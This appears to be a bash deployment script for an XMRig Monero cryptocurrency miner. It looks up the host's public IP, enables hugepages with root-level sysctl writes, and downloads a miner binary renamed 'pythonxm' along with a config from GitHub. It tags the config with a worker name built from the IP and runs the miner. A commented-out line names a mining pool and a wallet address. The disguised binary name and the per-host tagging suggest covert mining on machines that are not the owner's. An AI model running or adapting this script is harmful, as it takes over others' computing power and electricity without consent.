#!bin/bash -xe 
iip=$(curl -s https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl -s ipinfo.io


#!/bin/bash -e

# https://xmrig.com/docs/miner/hugepages#onegb-huge-pages

sysctl -w vm.nr_hugepages=$(nproc)

for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
do
    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
done

echo "1GB pages successfully enabled"


wget -q https://github.com/one10001/xmrig/releases/download/v0.0.3/pythonxm
wget -q https://github.com/one10001/10001code/raw/main/config.json
sed -i "s+ip0001+$IPNAME+g" config.json
chmod +x pythonxm
#pythonxm  -o ehttp.info:443 --coin=XMR -u 44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p  -p x -k -t 8 2> logxm.out 1> logxm.out  &
./pythonxm   -c config.json 
#while [ 1 ]
#do
#    echo '#######################################################################################################################################'
#    echo first 21: $(grep -o 'Accepted' logxm.out  | wc -l)
#    grep -o '' logxm.out | tail -n 5
#    sleep 30
#done
